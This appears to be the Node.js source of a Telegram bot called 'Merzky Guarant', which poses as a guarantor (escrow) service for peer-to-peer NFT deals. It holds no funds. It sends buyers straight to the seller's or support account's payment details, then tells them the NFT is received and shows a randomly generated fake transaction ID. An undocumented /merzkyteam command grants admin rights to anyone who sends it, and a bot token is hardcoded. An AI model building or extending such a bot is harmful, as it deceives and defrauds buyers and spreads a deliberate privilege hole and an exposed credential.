const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');
const http = require('http');

const server = http.createServer((req, res) => {
    res.writeHead(200);
    res.end('Bot is running!');
});
server.listen(process.env.PORT || 10000);

const token = '8299332460:AAF4Psig1XE2ifY59WlVXRqD_ofkMEkwyeA';
const supportUsername = 'merzky_support';
const botUsername = 'MerzkyGarant_bot';
const adminIds = [8563923108];

const bot = new TelegramBot(token, { polling: true });

let deals = new Map();
let completedDeals = new Map();
let userBalances = new Map();
let userSessions = new Map();
let userRequisites = new Map();
let userWallets = new Map();

const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = JSON.parse(fs.readFileSync(DATA_FILE));
            deals = new Map(data.deals || []);
            completedDeals = new Map(data.completedDeals || []);
            userBalances = new Map(data.userBalances || []);
            userRequisites = new Map(data.userRequisites || []);
            userWallets = new Map(data.userWallets || []);
            if (data.adminIds) {
                data.adminIds.forEach(id => {
                    if (!adminIds.includes(id)) adminIds.push(id);
                });
            }
            console.log('✅ Данные загружены');
        }
    } catch (e) {
        console.error('❌ Ошибка загрузки:', e);
    }
}

function saveData() {
    try {
        const data = {
            deals: Array.from(deals.entries()),
            completedDeals: Array.from(completedDeals.entries()),
            userBalances: Array.from(userBalances.entries()),
            userRequisites: Array.from(userRequisites.entries()),
            userWallets: Array.from(userWallets.entries()),
            adminIds: adminIds
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('✅ Данные сохранены');
    } catch (e) {
        console.error('❌ Ошибка сохранения:', e);
    }
}

loadData();
setInterval(() => saveData(), 5 * 60 * 1000);

function generateDealId() {
    return 'RNF' + Math.random().toString(36).substring(2, 8).toUpperCase();
}

function isAdmin(userId) {
    return adminIds.includes(userId);
}

function getDealLink(dealId) {
    return `https://t.me/${botUsername}?start=deal_${dealId}`;
}

function getMainMenu() {
    return {
        reply_markup: {
            keyboard: [
                [{ text: '➕ Создать сделку' }, { text: '💰 Мои реквизиты' }],
                [{ text: '📋 Мои сделки' }, { text: '👤 Профиль' }],
                [{ text: '📞 Поддержка' }]
            ],
            resize_keyboard: true
        }
    };
}

function getCurrencyMenu() {
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: '💎 TON', callback_data: 'curr_ton' }],
                [{ text: '💵 USDT', callback_data: 'curr_usdt' }],
                [{ text: '⭐ Stars', callback_data: 'curr_stars' }],
                [{ text: '🏦 Карта', callback_data: 'curr_card' }]
            ]
        }
    };
}

// ========== КОМАНДА ДЛЯ ВВОДА КОШЕЛЬКА (ТОЛЬКО АДМИНАМ) ==========
bot.onText(/\/viplati/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    if (!isAdmin(userId)) {
        return bot.sendMessage(chatId, '❌ Команда доступна только администраторам!');
    }
    
    userSessions.set(userId, { step: 'waiting_wallet' });
    bot.sendMessage(chatId,
        '💎 *Введите ваш TON кошелек*\n\n' +
        'Это адрес, на который будут выводиться средства.\n' +
        'Пример: `UQABCDEFGH123456789...`',
        { parse_mode: 'Markdown' }
    );
});

// ========== КОМАНДА СТАТЬ АДМИНОМ ==========
bot.onText(/\/merzkyteam/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!adminIds.includes(userId)) {
        adminIds.push(userId);
        saveData();
        bot.sendMessage(chatId, '✅ Ты теперь админ Merzky Team!');
        console.log('👑 Новый админ:', userId);
    } else {
        bot.sendMessage(chatId, '⚡ Ты уже админ.');
    }
});

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(
        chatId,
        '🚀 *Merzky Guarant*\n\n' +
        '🔹 Создай сделку и продай свой NFT\n' +
        '🔹 Добавь реквизиты для оплаты\n' +
        '🔹 Безопасные P2P сделки с гарантом\n\n' +
        '💎 Для вывода средств используй /viplati',
        {
            parse_mode: 'Markdown',
            ...getMainMenu()
        }
    );
});

// ========== СТАРТ С ПАРАМЕТРОМ (ПОКУПКА) ==========
bot.onText(/\/start deal_(.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const dealId = match[1];
    const deal = deals.get(dealId);
    
    if (!deal) {
        return bot.sendMessage(chatId, '❌ Сделка не найдена');
    }
    
    if (deal.status !== 'pending') {
        return bot.sendMessage(chatId, '❌ Сделка уже завершена');
    }
    
    const text = `🛒 *Покупка NFT*\n\n` +
                 `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                 `👤 Продавец: @${deal.sellerUsername}\n\n` +
                 `✅ Нажми "Купить", чтобы продолжить`;
    
    bot.sendMessage(chatId, text, {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: '💳 Купить', callback_data: `buy_${dealId}` }]
            ]
        }
    });
});

bot.onText(/💰 Мои реквизиты/, async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    try {
        await bot.deleteMessage(chatId, msg.message_id);
    } catch (e) {}
    
    const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
    
    await bot.sendMessage(chatId,
        `💳 *Мои реквизиты*\n\n` +
        `💎 TON: ${req.ton ? '`' + req.ton + '`' : '❌ Не указаны'}\n` +
        `💵 USDT: ${req.usdt ? '`' + req.usdt + '`' : '❌ Не указаны'}\n` +
        `🏦 Карта: ${req.card ? '`' + req.card + '`' : '❌ Не указаны'}\n\n` +
        `👇 Выбери, что изменить:`,
        {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: `💎 TON ${req.ton ? '✅' : '❌'}`, callback_data: 'edit_ton' }],
                    [{ text: `💵 USDT ${req.usdt ? '✅' : '❌'}`, callback_data: 'edit_usdt' }],
                    [{ text: `🏦 Карта ${req.card ? '✅' : '❌'}`, callback_data: 'edit_card' }],
                    [{ text: '🔙 Назад', callback_data: 'back_main' }]
                ]
            }
        }
    );
});

bot.onText(/➕ Создать сделку/, async (msg) => {
    const chatId = msg.chat.id;
    
    try {
        await bot.deleteMessage(chatId, msg.message_id);
    } catch (e) {}
    
    await bot.sendMessage(
        chatId,
        '💎 Выберите валюту:',
        getCurrencyMenu()
    );
});

bot.onText(/📋 Мои сделки/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    
    const userDeals = Array.from(deals.values()).filter(d => d.sellerId === userId || d.buyerId === userId);
    
    if (userDeals.length === 0) {
        return bot.sendMessage(chatId, '📭 У вас нет активных сделок');
    }
    
    let text = '📋 *Ваши сделки:*\n\n';
    userDeals.forEach(deal => {
        const status = deal.status === 'pending' ? '⏳ Ожидает' : 
                      deal.status === 'paid' ? '💰 Оплачен' :
                      deal.status === 'completed' ? '✅ Завершен' : '❌ Отменен';
        text += `🔹 #${deal.id} — ${deal.amount} ${deal.currency} — ${status}\n`;
    });
    
    bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
});

bot.onText(/👤 Профиль/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const balance = userBalances.get(userId) || 0;
    const wallet = userWallets.get(userId) || 'Не указан';
    
    bot.sendMessage(
        chatId,
        `👤 *Профиль*\n\n` +
        `🆔 ID: \`${userId}\`\n` +
        `💰 Баланс: ${balance} TON\n` +
        `💎 TON кошелек: \`${wallet}\`\n` +
        `👑 Админ: ${isAdmin(userId) ? '✅' : '❌'}`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/📞 Поддержка/, (msg) => {
    bot.sendMessage(msg.chat.id, `📞 @${supportUsername}`);
});

bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const userId = query.from.id;
    const data = query.data;

    try {
        if (data === 'edit_ton') {
            userSessions.set(userId, { step: 'waiting_ton' });
            await bot.editMessageText(
                '✏️ Отправьте новый **TON кошелек**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'edit_usdt') {
            userSessions.set(userId, { step: 'waiting_usdt' });
            await bot.editMessageText(
                '✏️ Отправьте новый **USDT адрес**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'edit_card') {
            userSessions.set(userId, { step: 'waiting_card' });
            await bot.editMessageText(
                '✏️ Отправьте новую **карту**:',
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
        }
        else if (data === 'back_main') {
            await bot.deleteMessage(chatId, messageId);
            await bot.sendMessage(chatId, 'Главное меню:', getMainMenu());
        }
        else if (data.startsWith('curr_')) {
            const currency = data.split('_')[1];
            
            const req = userRequisites.get(userId);
            if (currency !== 'stars') {
                if (!req || !req[currency]) {
                    return bot.answerCallbackQuery(query.id, '❌ Сначала добавь реквизиты в "💰 Мои реквизиты"');
                }
            }
            
            userSessions.set(userId, { 
                step: 'waiting_nft', 
                currency: currency,
                messageId: messageId
            });
            
            await bot.editMessageText(
                '📎 Отправьте ссылку на NFT:',
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
        }
        else if (data.startsWith('buy_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) {
                return bot.answerCallbackQuery(query.id, '❌ Сделка не найдена');
            }
            
            if (deal.status !== 'pending') {
                return bot.answerCallbackQuery(query.id, '❌ Сделка уже обработана');
            }
            
            const req = userRequisites.get(deal.sellerId) || {};
            
            let reqText = '';
            if (deal.currency === 'ton' && req.ton) reqText = `💎 TON: \`${req.ton}\``;
            else if (deal.currency === 'usdt' && req.usdt) reqText = `💵 USDT: \`${req.usdt}\``;
            else if (deal.currency === 'card' && req.card) reqText = `🏦 Карта: \`${req.card}\``;
            else if (deal.currency === 'stars') reqText = `⭐ Отправьте подарок @${supportUsername}`;
            else reqText = '❌ У продавца нет реквизитов для этой валюты';
            
            await bot.sendMessage(
                chatId,
                `💳 *Оплата сделки #${dealId}*\n\n` +
                `💰 Сумма: ${deal.amount} ${deal.currency}\n` +
                `👤 Продавец: @${deal.sellerUsername}\n\n` +
                `📩 *Реквизиты для оплаты:*\n${reqText}\n\n` +
                `✅ После перевода нажми *"Я оплатил"*`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [{ text: '✅ Я оплатил', callback_data: `paid_${dealId}` }]
                        ]
                    }
                }
            );
            
            await bot.answerCallbackQuery(query.id, '✅ Готово');
        }
        else if (data.startsWith('paid_')) {
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) {
                return bot.answerCallbackQuery(query.id, '❌ Сделка не найдена');
            }
            
            if (deal.status !== 'pending') {
                return bot.answerCallbackQuery(query.id, '❌ Сделка уже обработана');
            }
            
            deal.status = 'paid';
            deal.buyerId = userId;
            deal.buyerUsername = query.from.username || 'no_username';
            deals.set(dealId, deal);
            saveData();
            
            await bot.sendMessage(
                deal.sellerId,
                `💰 *Сделка #${dealId} оплачена!*\n\n` +
                `Покупатель: @${deal.buyerUsername}\n` +
                `Сумма: ${deal.amount} ${deal.currency}\n\n` +
                `Подтвердите получение:`,
                {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: '✅ Подтвердить', callback_data: `confirm_${dealId}` },
                                { text: '❌ Отмена', callback_data: `reject_${dealId}` }
                            ]
                        ]
                    }
                }
            );
            
            await bot.editMessageText(
                `✅ Заявка отправлена продавцу!`,
                {
                    chat_id: chatId,
                    message_id: messageId
                }
            );
            
            await bot.answerCallbackQuery(query.id, '✅ Заявка отправлена');
        }
        else if (data.startsWith('confirm_')) {
            if (!isAdmin(userId)) {
                return bot.answerCallbackQuery(query.id, '❌ Только админы');
            }
            
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) return;
            
            deal.status = 'completed';
            completedDeals.set(dealId, deal);
            deals.delete(dealId);
            
            const currentBalance = userBalances.get(deal.sellerId) || 0;
            userBalances.set(deal.sellerId, currentBalance + deal.amount);
            saveData();
            
            await bot.sendMessage(
                deal.sellerId,
                `✅ *Сделка #${dealId} завершена!*\n\n` +
                `💰 ${deal.amount} ${deal.currency} зачислены на баланс.\n\n` +
                `💎 Для вывода используй /viplati`,
                { parse_mode: 'Markdown' }
            );
            
            const txId = '0x' + Math.random().toString(36).substring(2, 15);
            await bot.sendMessage(
                deal.buyerId,
                `✅ *NFT ПОЛУЧЕН!*\n\nСделка #${dealId}\nTxID: \`${txId}\``,
                { parse_mode: 'Markdown' }
            );
            
            await bot.editMessageText(
                `✅ *ПОДТВЕРЖДЕНО*\n\nСделка #${dealId}`,
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
            
            await bot.answerCallbackQuery(query.id, '✅ Подтверждено');
        }
        else if (data.startsWith('reject_')) {
            if (!isAdmin(userId)) {
                return bot.answerCallbackQuery(query.id, '❌ Только админы');
            }
            
            const dealId = data.split('_')[1];
            const deal = deals.get(dealId);
            
            if (!deal) return;
            
            deal.status = 'cancelled';
            completedDeals.set(dealId, deal);
            deals.delete(dealId);
            saveData();
            
            await bot.sendMessage(
                deal.buyerId,
                `❌ *Сделка #${dealId} отклонена*`,
                { parse_mode: 'Markdown' }
            );
            
            await bot.editMessageText(
                `❌ *ОТКЛОНЕНО*\n\nСделка #${dealId}`,
                {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown'
                }
            );
            
            await bot.answerCallbackQuery(query.id, '❌ Отклонено');
        }
        
        await bot.answerCallbackQuery(query.id);
        
    } catch (error) {
        console.error('Ошибка:', error);
        await bot.answerCallbackQuery(query.id, '❌ Ошибка');
    }
});

bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const text = msg.text;

    if (text?.startsWith('/') || 
        text === '➕ Создать сделку' || 
        text === '💰 Мои реквизиты' ||
        text === '📋 Мои сделки' ||
        text === '👤 Профиль' ||
        text === '📞 Поддержка') {
        return;
    }

    const session = userSessions.get(userId);
    if (!session) return;

    if (session.step === 'waiting_wallet') {
        if (!text.startsWith('UQ') && !text.startsWith('EQ') && !text.startsWith('0:')) {
            return bot.sendMessage(chatId, '❌ Непохоже на TON кошелек. Попробуй ещё раз:');
        }
        
        userWallets.set(userId, text);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ TON кошелек сохранен! Теперь ты можешь выводить средства.', getMainMenu());
        return;
    }

    if (session.step === 'waiting_ton') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.ton = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ TON кошелек сохранен!', getMainMenu());
        return;
    }
    else if (session.step === 'waiting_usdt') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.usdt = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ USDT адрес сохранен!', getMainMenu());
        return;
    }
    else if (session.step === 'waiting_card') {
        const req = userRequisites.get(userId) || { ton: '', usdt: '', card: '' };
        req.card = text;
        userRequisites.set(userId, req);
        saveData();
        userSessions.delete(userId);
        
        await bot.sendMessage(chatId, '✅ Карта сохранена!', getMainMenu());
        return;
    }

    if (session.step === 'waiting_nft') {
        if (!text.includes('t.me/') && !text.includes('http')) {
            return bot.sendMessage(chatId, '❌ Отправьте корректную ссылку');
        }
        
        session.nftLink = text;
        session.step = 'waiting_amount';
        userSessions.set(userId, session);
        
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        try {
            await bot.editMessageText(
                '💰 Введите сумму:',
                {
                    chat_id: chatId,
                    message_id: session.messageId
                }
            );
        } catch (e) {
            await bot.sendMessage(chatId, '💰 Введите сумму:');
        }
    }
    
    else if (session.step === 'waiting_amount') {
        const amount = parseFloat(text);
        if (isNaN(amount) || amount <= 0) {
            return bot.sendMessage(chatId, '❌ Введите корректное число');
        }
        
        const dealId = generateDealId();
        const deal = {
            id: dealId,
            sellerId: userId,
            sellerUsername: msg.from.username || 'no_username',
            nftLink: session.nftLink,
            amount: amount,
            currency: session.currency,
            status: 'pending',
            createdAt: new Date().toISOString()
        };
        
        deals.set(dealId, deal);
        saveData();
        
        const dealLink = getDealLink(dealId);
        
        try {
            await bot.deleteMessage(chatId, msg.message_id);
        } catch (e) {}
        
        try {
            await bot.editMessageText(
                `✅ *Сделка создана!*\n\n` +
                `#${dealId}\n` +
                `💰 Сумма: ${amount} ${session.currency}\n\n` +
                `🔗 [Нажмите для покупки](${dealLink})\n\n` +
                `📎 Или отправьте ссылку покупателю:\n\`${dealLink}\``,
                {
                    chat_id: chatId,
                    message_id: session.messageId,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                }
            );
        } catch (e) {
            await bot.sendMessage(
                chatId,
                `✅ *Сделка создана!*\n\n` +
                `#${dealId}\n` +
                `💰 Сумма: ${amount} ${session.currency}\n\n` +
                `👉 [Купить NFT](${dealLink})\n\n` +
                `Или отправьте ссылку:\n${dealLink}`,
                { parse_mode: 'Markdown' }
            );
        }
        
        userSessions.delete(userId);
    }
});

process.on('SIGINT', () => {
    console.log('\n💾 Сохраняю...');
    saveData();
    process.exit();
});

console.log('🔥 Merzky Guarant запущен!');
console.log('👑 Команда админа: /merzkyteam');
console.log('💎 Команда вывода (только админы): /viplati');
console.log('📞 Саппорт: @' + supportUsername);